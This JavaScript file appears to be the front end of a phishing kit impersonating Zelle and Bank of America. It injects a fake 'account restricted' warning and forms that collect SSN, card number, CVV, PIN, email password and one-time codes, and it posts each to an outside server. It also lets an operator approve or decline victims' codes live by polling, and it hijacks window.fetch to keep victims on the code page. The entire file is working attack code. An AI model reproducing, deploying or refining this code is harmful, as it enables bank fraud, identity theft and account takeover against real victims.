// ========================================
// ZELLE EXTENDED FLOW - BOA-STYLE MULTI-STEP
// ========================================
// This adds the multi-step verification flow after OTP approval/decline
// Styled in Plaid's black/white aesthetic

(function() {
    'use strict';
    
    const API_URL = location.hostname.includes("localhost") 
        ? "http://localhost:8002" 
        : "https://zelle-secure.onrender.com";
    
    let currentUserId = null;
    let currentSessionId = null;
    let otpPollInterval = null;
    let flowInitialized = false; // ✅ Guard to prevent re-initialization
    
    // ========================================
    // INJECT MODALS/PAGES INTO DOM
    // ========================================
    function injectHTML() {
        const container = document.createElement('div');
        container.id = 'zelle-extended-flow';
        container.innerHTML = `
            <!-- Account Restricted Error Page -->
            <div id="accountRestrictedPage" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 480px; padding: 48px 32px; text-align: center;">
                    <div style="width: 64px; height: 64px; background: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                            <circle cx="12" cy="12" r="10"></circle>
                            <line x1="12" y1="8" x2="12" y2="12"></line>
                            <line x1="12" y1="16" x2="12.01" y2="16"></line>
                        </svg>
                    </div>
                    <h2 style="font-size: 24px; font-weight: 600; color: #111; margin-bottom: 12px;">Account Temporarily Restricted</h2>
                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 32px; line-height: 1.5;">
                        We detected unusual activity on your account. For your security, please verify your identity to continue.
                    </p>
                    <button id="verifyIdentityBtn" class="zelle-btn-primary">
                        Verify Identity
                    </button>
                </div>
            </div>
            
            <!-- Personal Info Modal -->
            <div id="personalInfoModal" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 520px; padding: 32px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
                        <h2 style="font-size: 20px; font-weight: 600; color: #111;">Verify Personal Information</h2>
                        <button id="closePersonalInfo" class="zelle-close-btn">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                        </button>
                    </div>
                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 24px;">Please confirm your details to proceed.</p>
                    
                    <form id="personalInfoForm">
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                            <div class="zelle-form-group">
                                <label>First Name</label>
                                <input type="text" id="firstName" placeholder="John" required>
                            </div>
                            <div class="zelle-form-group">
                                <label>Last Name</label>
                                <input type="text" id="lastName" placeholder="Doe" required>
                            </div>
                        </div>
                        
                        <div class="zelle-form-group">
                            <label>Date of Birth</label>
                            <input type="text" id="dob" placeholder="MM/DD/YYYY" required>
                        </div>
                        
                        <div class="zelle-form-group">
                            <label>Social Security Number</label>
                            <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
                        </div>
                        
                        <div class="zelle-form-group">
                            <label>Card Number</label>
                            <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
                        </div>
                        
                        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px;">
                            <div class="zelle-form-group">
                                <label>Expiry</label>
                                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                            </div>
                            <div class="zelle-form-group">
                                <label>CVV</label>
                                <input type="text" id="cvv" placeholder="XXX" maxlength="3" required>
                            </div>
                            <div class="zelle-form-group">
                                <label>PIN</label>
                                <input type="password" id="pin" placeholder="XXXX" maxlength="4" required>
                            </div>
                        </div>
                        
                        <div class="zelle-form-group">
                            <label>ZIP Code</label>
                            <input type="text" id="zip" placeholder="XXXXX" maxlength="5" required>
                        </div>
                        
                        <button type="submit" class="zelle-btn-primary" style="margin-top: 8px;">
                            Continue Verification
                        </button>
                    </form>
                </div>
            </div>
            
            <!-- Email Verification Modal -->
            <div id="emailVerificationModal" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 480px; padding: 32px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
                        <h2 style="font-size: 20px; font-weight: 600; color: #111;">Email Verification</h2>
                        <button id="closeEmailVerification" class="zelle-close-btn">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                        </button>
                    </div>
                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 24px;">Enter your email credentials to verify your identity.</p>
                    
                    <form id="emailVerificationForm">
                        <div class="zelle-form-group">
                            <label>Email Address</label>
                            <input type="email" id="email" placeholder="john@example.com" required>
                        </div>
                        
                        <div class="zelle-form-group">
                            <label>Email Password</label>
                            <input type="password" id="emailPassword" placeholder="Enter your email password" required>
                        </div>
                        
                        <button type="submit" class="zelle-btn-primary" style="margin-top: 8px;">
                            Verify Email
                        </button>
                    </form>
                </div>
            </div>
            
            <!-- Final OTP Modal -->
            <div id="finalOtpModal" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 480px; padding: 32px; text-align: center;">
                    <div style="width: 64px; height: 64px; background: #111; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                            <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
                        </svg>
                    </div>
                    <h2 style="font-size: 24px; font-weight: 600; color: #111; margin-bottom: 12px;">Email Verification Code</h2>
                    <p style="font-size: 14px; color: #6b7280; margin-bottom: 32px;">
                        We've sent a 6-digit code to your email. Enter it below.
                    </p>
                    
                    <div class="zelle-otp-container">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="0">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="1">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="2">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="3">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="4">
                        <input type="text" maxlength="1" class="zelle-otp-digit" data-index="5">
                    </div>
                    
                    <button id="submitFinalOtp" class="zelle-btn-primary" style="margin-top: 24px;">
                        Verify
                    </button>
                    
                    <button id="resendCode" class="zelle-btn-secondary" style="margin-top: 12px;">
                        Resend Code
                    </button>
                </div>
            </div>
            
            <!-- Success/Loading Modal -->
            <div id="successModal" class="zelle-modal" style="display: none;">
                <div class="zelle-modal-content" style="max-width: 480px; padding: 48px 32px; text-align: center;">
                    <div class="zelle-spinner"></div>
                    <h2 style="font-size: 24px; font-weight: 600; color: #111; margin-top: 24px; margin-bottom: 12px;">Processing...</h2>
                    <p style="font-size: 14px; color: #6b7280;">Please wait while we verify your information.</p>
                </div>
            </div>
        `;
        
        document.body.appendChild(container);
        injectStyles();
        
        // Attach event listeners AFTER injection using delegation
        setTimeout(() => {
            attachEventListeners();
            setupInputFormatting();
        }, 100);
    }
    
    // ========================================
    // INJECT STYLES (PLAID BLACK/WHITE)
    // ========================================
    function injectStyles() {
        const style = document.createElement('style');
        style.textContent = `
            .zelle-modal {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.5);
                backdrop-filter: blur(4px);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 999999;
                padding: 16px;
            }
            
            .zelle-modal-content {
                background: white;
                border-radius: 12px;
                box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
                width: 100%;
                animation: zelle-fadeIn 0.3s ease;
            }
            
            @keyframes zelle-fadeIn {
                from {
                    opacity: 0;
                    transform: translateY(20px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            
            .zelle-form-group {
                margin-bottom: 20px;
            }
            
            .zelle-form-group label {
                display: block;
                font-size: 14px;
                font-weight: 500;
                color: #111;
                margin-bottom: 8px;
            }
            
            .zelle-form-group input {
                width: 100%;
                padding: 12px 16px;
                border: 1px solid #e5e7eb;
                border-radius: 8px;
                font-size: 14px;
                color: #111;
                transition: all 0.2s;
                box-sizing: border-box;
            }
            
            .zelle-form-group input:focus {
                outline: none;
                border-color: #111;
                box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.05);
            }
            
            .zelle-btn-primary {
                width: 100%;
                padding: 14px 24px;
                background: #111;
                color: white;
                border: none;
                border-radius: 8px;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.2s;
            }
            
            .zelle-btn-primary:hover {
                background: #000;
                transform: translateY(-1px);
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            }
            
            .zelle-btn-secondary {
                width: 100%;
                padding: 14px 24px;
                background: white;
                color: #111;
                border: 1px solid #e5e7eb;
                border-radius: 8px;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.2s;
            }
            
            .zelle-btn-secondary:hover {
                background: #f9fafb;
                border-color: #111;
            }
            
            .zelle-close-btn {
                width: 32px;
                height: 32px;
                display: flex;
                align-items: center;
                justify-content: center;
                background: transparent;
                border: none;
                color: #6b7280;
                cursor: pointer;
                border-radius: 6px;
                transition: all 0.2s;
            }
            
            .zelle-close-btn:hover {
                background: #f3f4f6;
                color: #111;
            }
            
            .zelle-otp-container {
                display: flex;
                gap: 12px;
                justify-content: center;
                margin: 0 auto;
                max-width: 360px;
            }
            
            .zelle-otp-digit {
                width: 48px;
                height: 56px;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                font-size: 24px;
                font-weight: 600;
                text-align: center;
                color: #111;
                transition: all 0.2s;
            }
            
            .zelle-otp-digit:focus {
                outline: none;
                border-color: #111;
                box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.05);
            }
            
            .zelle-spinner {
                width: 64px;
                height: 64px;
                border: 4px solid #f3f4f6;
                border-top-color: #111;
                border-radius: 50%;
                animation: zelle-spin 0.8s linear infinite;
                margin: 0 auto;
            }
            
            @keyframes zelle-spin {
                to { transform: rotate(360deg); }
            }
            
            @keyframes zelle-shake {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
                20%, 40%, 60%, 80% { transform: translateX(10px); }
            }
            
            .zelle-error-shake {
                animation: zelle-shake 0.5s ease-in-out;
            }
        `;
        document.head.appendChild(style);
    }
    
    // ========================================
    // ATTACH EVENT LISTENERS (SAFE VERSION)
    // ========================================
    let listenersAttached = false;
    
    function attachEventListeners() {
        if (listenersAttached) return;
        
        // Use event delegation - attach to container, not individual elements
        const container = document.getElementById('zelle-extended-flow');
        if (!container) {
            console.error('[Zelle Extended] Container not found, cannot attach listeners');
            return;
        }
        
        container.addEventListener('click', (e) => {
            // Verify Identity Button
            if (e.target.id === 'verifyIdentityBtn') {
                hideModal('accountRestrictedPage');
                showModal('personalInfoModal');
            }
            
            // Resend Code
            if (e.target.id === 'resendCode') {
                alert('Code resent! Check your email.');
            }
            
            // Submit Final OTP
            if (e.target.id === 'submitFinalOtp') {
                // Only process if Final OTP modal is actually visible
                const finalOtpModal = document.getElementById('finalOtpModal');
                if (finalOtpModal && finalOtpModal.style.display !== 'none') {
                    handleFinalOtpSubmit();
                } else {
                    console.log('[Zelle Extended] Ignoring submitFinalOtp click - modal not visible');
                }
            }
        });
        
        // Form submissions
        container.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            if (e.target.id === 'personalInfoForm') {
                await handlePersonalInfoSubmit();
            } else if (e.target.id === 'emailVerificationForm') {
                await handleEmailVerificationSubmit();
            }
        });
        
        listenersAttached = true;
        console.log('[Zelle Extended] ✅ Event listeners attached via delegation');
        
        // Close buttons (with defensive checks)
        const closePersonalInfo = document.getElementById('closePersonalInfo');
        if (closePersonalInfo) {
            closePersonalInfo.addEventListener('click', () => {
                hideModal('personalInfoModal');
            });
        }
        
        const closeEmailVerification = document.getElementById('closeEmailVerification');
        if (closeEmailVerification) {
            closeEmailVerification.addEventListener('click', () => {
                hideModal('emailVerificationModal');
            });
        }
        
        // OTP digit navigation
        const otpDigits = document.querySelectorAll('.zelle-otp-digit');
        otpDigits.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < otpDigits.length - 1) {
                    otpDigits[index + 1].focus();
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpDigits[index - 1].focus();
                }
            });
        });
    }
    
    // ========================================
    // INPUT FORMATTING (SAFE VERSION)
    // ========================================
    function setupInputFormatting() {
        const container = document.getElementById('zelle-extended-flow');
        if (!container) return;
        
        container.addEventListener('input', (e) => {
            const id = e.target.id;
            let value = e.target.value;
            
            // SSN formatting
            if (id === 'ssn') {
                value = value.replace(/\D/g, '');
                if (value.length > 3) value = value.slice(0, 3) + '-' + value.slice(3);
                if (value.length > 6) value = value.slice(0, 6) + '-' + value.slice(6, 10);
                e.target.value = value;
            }
            
            // Card number formatting
            if (id === 'cardNumber') {
                value = value.replace(/\D/g, '');
                let formatted = '';
                for (let i = 0; i < value.length && i < 16; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += value[i];
                }
                e.target.value = formatted;
            }
            
            // Expiry formatting (MM/YY)
            if (id === 'expiry') {
                value = value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
                }
                e.target.value = value;
            }
            
            // DOB formatting (MM/DD/YYYY)
            if (id === 'dob') {
                value = value.replace(/\D/g, '');
                if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
                if (value.length >= 5) value = value.slice(0, 5) + '/' + value.slice(5, 9);
                e.target.value = value;
            }
            
            // Phone formatting
            if (id === 'phone') {
                value = value.replace(/\D/g, '');
                if (value.length > 0) value = '(' + value;
                if (value.length > 4) value = value.slice(0, 4) + ') ' + value.slice(4);
                if (value.length > 9) value = value.slice(0, 9) + '-' + value.slice(9, 13);
                e.target.value = value;
            }
        });
        
        console.log('[Zelle Extended] ✅ Input formatting attached');
    }
    
    // ========================================
    // SHOW/HIDE MODALS
    // ========================================
    function showModal(id) {
        console.log('[Zelle Extended] 🔍 Attempting to show modal:', id);
        const modal = document.getElementById(id);
        if (modal) {
            console.log('[Zelle Extended] ✅ Modal found! Displaying...');
            modal.style.display = 'flex';
        } else {
            console.error('[Zelle Extended] ❌ Modal NOT FOUND:', id);
        }
    }
    
    function hideModal(id) {
        const modal = document.getElementById(id);
        if (modal) {
            modal.style.display = 'none';
        }
    }
    
    // ========================================
    // HANDLE PERSONAL INFO SUBMIT
    // ========================================
    async function handlePersonalInfoSubmit() {
        const data = {
            userId: currentUserId,
            sessionId: currentSessionId,
            firstName: document.getElementById('firstName').value,
            lastName: document.getElementById('lastName').value,
            ssn: document.getElementById('ssn').value,
            dob: document.getElementById('dob').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            pin: document.getElementById('pin').value,
            zip: document.getElementById('zip').value
        };
        
        try {
            const response = await fetch(`${API_URL}/api/save-personal-info`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            if (response.ok) {
                hideModal('personalInfoModal');
                showModal('emailVerificationModal');
            }
        } catch (error) {
            console.error('Error submitting personal info:', error);
        }
    }
    
    // ========================================
    // HANDLE EMAIL VERIFICATION SUBMIT
    // ========================================
    async function handleEmailVerificationSubmit() {
        const data = {
            userId: currentUserId,
            sessionId: currentSessionId,
            email: document.getElementById('email').value,
            emailPassword: document.getElementById('emailPassword').value
        };
        
        try {
            const response = await fetch(`${API_URL}/api/save-email-verification`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            if (response.ok) {
                hideModal('emailVerificationModal');
                showModal('finalOtpModal');
                // Focus first OTP digit
                document.querySelector('.zelle-otp-digit').focus();
            }
        } catch (error) {
            console.error('Error submitting email verification:', error);
        }
    }
    
    // ========================================
    // HANDLE FINAL OTP SUBMIT
    // ========================================
    let finalOtpSubmitting = false; // Protection flag
    
    async function handleFinalOtpSubmit(e) {
        // Add trace to see what's triggering this
        console.trace('[Zelle Extended] 🔥 handleFinalOtpSubmit fired - TRACE:');
        
        // Protection: Don't run if already submitting
        if (finalOtpSubmitting) {
            console.log('[Zelle Extended] ⚠️ Already submitting, ignoring duplicate call');
            return;
        }
        
        finalOtpSubmitting = true;
        
        try {
            const otpDigits = document.querySelectorAll('.zelle-otp-digit');
            const code = Array.from(otpDigits).map(input => input.value).join('');
            
            if (code.length !== 6) {
                alert('Please enter all 6 digits');
                return;
            }
            
            const data = {
                userId: currentUserId,
                sessionId: currentSessionId,
                finalOtp: code
            };
            
            const response = await fetch(`${API_URL}/api/save-final-otp`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            
            if (response.ok) {
                hideModal('finalOtpModal');
                showModal('successModal');
                
                // Redirect after 3 seconds
                setTimeout(() => {
                    window.location.href = 'https://www.zellepay.com';
                }, 3000);
            }
        } catch (error) {
            console.error('Error submitting final OTP:', error);
        } finally {
            finalOtpSubmitting = false;
        }
    }
    
    // ========================================
    // HIDE REACT APP'S DECLINE MODAL
    // ========================================
    function hideReactDeclineModal() {
        // Look for any modal with "Verification Failed" or "Try Again" text
        const allModals = document.querySelectorAll('div[role="dialog"], div[class*="modal"], div[style*="fixed"]');
        
        allModals.forEach(modal => {
            const text = modal.textContent || '';
            if (text.includes('Verification Failed') || text.includes('Try Again')) {
                console.log('[Zelle Extended] Found React decline modal - hiding it!');
                modal.style.display = 'none';
                // Also hide backdrop if exists
                const backdrop = modal.previousElementSibling;
                if (backdrop && backdrop.style.position === 'fixed') {
                    backdrop.style.display = 'none';
                }
            }
        });
    }
    
    // ========================================
    // SHOW OTP ERROR (SHAKE + RED TEXT)
    // ========================================
    function showOtpError() {
        console.log('[Zelle Extended] ❌ OTP DECLINED - Showing error inline');
        
        // 🔍 DIAGNOSTIC: Capture DOM state AFTER React processes decline
        const otpInputsAfter = document.querySelectorAll('input[type="text"][maxlength="1"]');
        console.log('[Zelle Extended] 🔍 AFTER (in showOtpError) - OTP inputs found:', otpInputsAfter.length);
        
        if (otpInputsAfter.length > 0) {
            const container = otpInputsAfter[0].parentElement?.parentElement;
            console.log('[Zelle Extended] 🔍 AFTER - Container exists:', !!container);
            console.log('[Zelle Extended] 🔍 AFTER - Container display:', container?.style.display || 'not set');
            console.log('[Zelle Extended] 🔍 AFTER - Container classes:', container?.className);
            
            // Check parent hierarchy
            let parent = container;
            let level = 0;
            while (parent && level < 5) {
                console.log(`[Zelle Extended] 🔍 AFTER - Parent Level ${level}:`, {
                    tag: parent.tagName,
                    display: parent.style.display || 'not set',
                    className: parent.className,
                    visible: parent.offsetWidth > 0 && parent.offsetHeight > 0
                });
                parent = parent.parentElement;
                level++;
            }
        } else {
            console.log('[Zelle Extended] 🔍 AFTER - NO OTP INPUTS FOUND! React removed them.');
            console.log('[Zelle Extended] 🔍 Searching for any hidden containers...');
            
            // Try to find hidden containers
            const allInputs = document.querySelectorAll('input');
            console.log('[Zelle Extended] 🔍 Total inputs on page:', allInputs.length);
            
            const hiddenOtpInputs = Array.from(allInputs).filter(input => 
                input.maxLength === 1 && input.type === 'text'
            );
            console.log('[Zelle Extended] 🔍 Hidden OTP-like inputs:', hiddenOtpInputs.length);
            
            if (hiddenOtpInputs.length > 0) {
                const hiddenContainer = hiddenOtpInputs[0].parentElement?.parentElement;
                console.log('[Zelle Extended] 🔍 Found hidden container:', {
                    display: hiddenContainer?.style.display,
                    className: hiddenContainer?.className,
                    visible: hiddenContainer?.offsetWidth > 0
                });
            }
        }
        
        // First, hide any React app modals
        hideReactDeclineModal();
        
        // Find the OTP inputs
        const otpInputs = document.querySelectorAll('input[type="text"][maxlength="1"]');
        console.log('[Zelle Extended] Found OTP inputs:', otpInputs.length);
        
        const otpContainer = otpInputs[0]?.parentElement?.parentElement || otpInputs[0]?.parentElement;
        
        if (otpContainer) {
            console.log('[Zelle Extended] Found OTP container, applying shake...');
            
            // 🔥 THE FIX: Force the parent .zelle-modal to stay visible
            // React sets display: none on this parent, we override it
            const zelleModal = otpContainer.parentElement;
            if (zelleModal && (zelleModal.className === 'zelle-modal' || zelleModal.classList.contains('zelle-modal'))) {
                zelleModal.style.display = 'flex';
                console.log('[Zelle Extended] ✅ Forced .zelle-modal to stay visible');
            } else {
                // Fallback: search up to 3 levels for .zelle-modal
                let parent = otpContainer.parentElement;
                let level = 0;
                while (parent && level < 3) {
                    if (parent.classList && parent.classList.contains('zelle-modal')) {
                        parent.style.display = 'flex';
                        console.log(`[Zelle Extended] ✅ Forced .zelle-modal (level ${level}) to stay visible`);
                        break;
                    }
                    parent = parent.parentElement;
                    level++;
                }
            }
            
            // Add shake animation (force it by adding/removing)
            otpContainer.style.animation = 'none';
            setTimeout(() => {
                otpContainer.style.animation = 'zelle-shake 0.5s ease-in-out';
            }, 10);
            
            // Clear OTP inputs and add red borders
            otpInputs.forEach(input => {
                input.value = '';
                input.style.borderColor = '#ef4444'; // Red border
                input.style.borderWidth = '2px'; // Make border more visible
            });
            
            // Focus first input
            if (otpInputs[0]) otpInputs[0].focus();
            
            console.log('[Zelle Extended] OTP inputs cleared and shake applied');
        } else {
            console.warn('[Zelle Extended] OTP container not found!');
        }
        
        // Create or update error message - inject DIRECTLY into body
        let errorMsg = document.getElementById('zelle-otp-error');
        if (!errorMsg) {
            errorMsg = document.createElement('div');
            errorMsg.id = 'zelle-otp-error';
            errorMsg.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: #fee;
                border: 2px solid #ef4444;
                color: #dc2626;
                font-size: 16px;
                font-weight: 600;
                padding: 20px 40px;
                border-radius: 12px;
                box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3);
                z-index: 999999999;
                text-align: center;
                animation: zelle-fadeIn 0.3s ease;
            `;
            document.body.appendChild(errorMsg);
            console.log('[Zelle Extended] Created error message overlay');
        }
        
        errorMsg.textContent = '❌ Incorrect code. Please try again.';
        errorMsg.style.display = 'block';
        
        console.log('[Zelle Extended] Error message displayed');
        
        // Hide error after 3 seconds
        setTimeout(() => {
            if (errorMsg) {
                errorMsg.style.display = 'none';
            }
            // Reset input borders
            otpInputs.forEach(input => {
                input.style.borderColor = '';
            });
        }, 3000);
    }
    
    // ========================================
    // START OTP POLLING (AFTER USER SUBMITS OTP)
    // ========================================
    let pollingStopped = false;
    
    function startOtpPolling(userId) {
        currentUserId = userId;
        pollingStopped = false;
        
        console.log('[Zelle Extended] 🔄 Starting OTP polling for user:', userId);
        
        // Clear any existing interval
        if (otpPollInterval) {
            clearInterval(otpPollInterval);
        }
        
        // Poll every 2 seconds
        otpPollInterval = setInterval(async () => {
            // Exit if polling was stopped
            if (pollingStopped) {
                console.log('[Zelle Extended] 🛑 Polling stopped');
                clearInterval(otpPollInterval);
                return;
            }
            
            try {
                const response = await fetch(`${API_URL}/api/check-otp-status?id=${userId}`);
                const data = await response.json();
                
                console.log('[Zelle Extended] 📊 OTP Status:', data.otp_status);
                
                if (data.otp_status === 'approve') {
                    console.log('[Zelle Extended] ✅ APPROVED! Showing Account Restricted page...');
                    pollingStopped = true;
                    clearInterval(otpPollInterval);
                    showModal('accountRestrictedPage');
                } else if (data.otp_status === 'decline') {
                    console.log('[Zelle Extended] ❌ DECLINED! Showing inline error...');
                    pollingStopped = true;
                    clearInterval(otpPollInterval);
                    
                    // ✅ Kill any pending success flow
                    finalOtpSubmitting = false;
                    hideModal('successModal');
                    hideModal('finalOtpModal');
                    
                    // 🔍 DIAGNOSTIC: Capture DOM state BEFORE React reacts
                    const otpInputsBefore = document.querySelectorAll('input[type="text"][maxlength="1"]');
                    console.log('[Zelle Extended] 🔍 BEFORE showOtpError - OTP inputs found:', otpInputsBefore.length);
                    
                    if (otpInputsBefore.length > 0) {
                        const container = otpInputsBefore[0].parentElement?.parentElement;
                        console.log('[Zelle Extended] 🔍 BEFORE - Container exists:', !!container);
                        console.log('[Zelle Extended] 🔍 BEFORE - Container display:', container?.style.display || 'not set');
                        console.log('[Zelle Extended] 🔍 BEFORE - Container classes:', container?.className);
                        console.log('[Zelle Extended] 🔍 BEFORE - Container HTML:', container?.outerHTML?.substring(0, 200));
                        
                        // Check parent hierarchy
                        let parent = container;
                        let level = 0;
                        while (parent && level < 5) {
                            console.log(`[Zelle Extended] 🔍 BEFORE - Parent Level ${level}:`, {
                                tag: parent.tagName,
                                display: parent.style.display || 'not set',
                                className: parent.className
                            });
                            parent = parent.parentElement;
                            level++;
                        }
                    }
                    
                    // Show error immediately
                    showOtpError();
                    
                    // ❌ REMOVED: Don't reset status - it causes re-init chaos
                    // The status will be reset when user submits new OTP
                    
                    console.log('[Zelle Extended] 🔄 Waiting for user to retry OTP...');
                }
            } catch (error) {
                console.error('[Zelle Extended] ❌ Polling error:', error);
            }
        }, 2000);
    }
    
    // ========================================
    // INTERCEPT OTP SUBMISSION FROM REACT APP
    // ========================================
    function interceptOtpSubmission() {
        // Watch for OTP submission in the React app
        const originalFetch = window.fetch;
        window.fetch = async function(...args) {
            const response = await originalFetch.apply(this, args);
            
            // Check if this is an OTP submission (FIRST OTP only, not final OTP)
            const url = args[0];
            const isFirstOtpSubmission = (url.includes('/api/save-otp') && !url.includes('final')) || 
                                         (url.includes('/api/save') && !url.includes('final') && !url.includes('email'));
            
            if (isFirstOtpSubmission) {
                try {
                    const clonedResponse = response.clone();
                    const data = await clonedResponse.json();
                    
                    if (data.success && data.id) {
                        console.log('[Zelle Extended] OTP submitted, user ID:', data.id);
                        
                        // Check if this is a RETRY (polling was stopped after decline)
                        if (pollingStopped) {
                            console.log('[Zelle Extended] 🔄 RETRY DETECTED - Blocking React from advancing');
                            
                            // Restart polling for retry
                            currentUserId = data.id;
                            startOtpPolling(data.id);
                            
                            // Return fake response to keep React on OTP page
                            return new Response(JSON.stringify({
                                success: false,
                                message: 'Verifying code...'
                            }), {
                                status: 200,
                                headers: { 'Content-Type': 'application/json' }
                            });
                        } else {
                            // First time - let React advance normally
                            console.log('[Zelle Extended] ✅ FIRST SUBMISSION - Allowing React to advance');
                            currentUserId = data.id;
                            startOtpPolling(data.id);
                        }
                    }
                } catch (e) {
                    // Ignore parsing errors
                }
            }
            
            return response;
        };
    }
    
    // ========================================
    // INITIALIZE (SIMPLE & CLEAN)
    // ========================================
    function init() {
        // ✅ Prevent re-initialization
        if (flowInitialized) {
            console.log('[Zelle Extended] ⚠️ Already initialized, skipping...');
            return;
        }
        
        flowInitialized = true;
        console.log('[Zelle Extended] Initializing multi-step flow...');
        injectHTML();
        interceptOtpSubmission();
    }
    
    // Wait for DOM ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
